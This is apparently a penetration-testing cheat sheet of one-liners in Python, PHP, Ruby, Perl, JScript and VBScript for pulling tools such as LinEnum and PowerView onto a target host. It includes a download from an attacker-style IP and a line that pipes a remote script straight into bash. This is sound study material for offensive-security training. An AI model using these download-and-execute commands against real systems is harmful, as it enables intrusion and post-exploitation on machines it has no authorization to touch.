# Transferring Files with Code

### Python

python 2

```python
python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

python 3

```python
python3 -c 'import urllib.request; urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```


### PHP

With `file_get_contents()`:


```
php -r '$file = file_get_contents("http://192.168.45.246/backup.exe");file_put_contents("backup.exe", $file);'
```


With `fopen()`:


```php
php -r 'const BUFFER = 1024; $fremote = fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```


Directly output a file and pipe it to Bash:

```php
php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```


> **Note:** The URL can be used as a filename with the `@file` function if the `fopen` wrappers have been enabled.



### Ruby

```ruby
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```


### Perl

```perl
perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```




### JavaScript

* create a file wget.js with following code:

```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1; // Binary
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1), 2); // 2 = Overwrite if the file exists
```

* Download a File Using JavaScript and cscript.exe

```
cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```


### VBScript

1. **Create a VBScript File**: Open your text editor and paste the following VBScript code into a new file. Save this file as `wget.vbs`.
2.  ```vbnet
    dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
    dim bStrm: Set bStrm = createobject("Adodb.Stream")
    xHttp.Open "GET", WScript.Arguments.Item(0), False
    xHttp.Send

    with bStrm
        .type = 1 ' Binary
        .open
        .write xHttp.responseBody
        .savetofile WScript.Arguments.Item(1), 2 ' 2 = Overwrite if the file exists
    end with

    2. **Use the Script to Download a File**: To download a file, use the `cscript.exe` command in the Command Prompt (cmd.exe) or Windows PowerShell, specifying the URL of the file and the local filename to save it as.

    Example command:

    
    ```
    cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
    ```


    This command downloads the PowerShell script `PowerView.ps1` from the specified URL and saves it as `PowerView2.ps1` in the current directory.

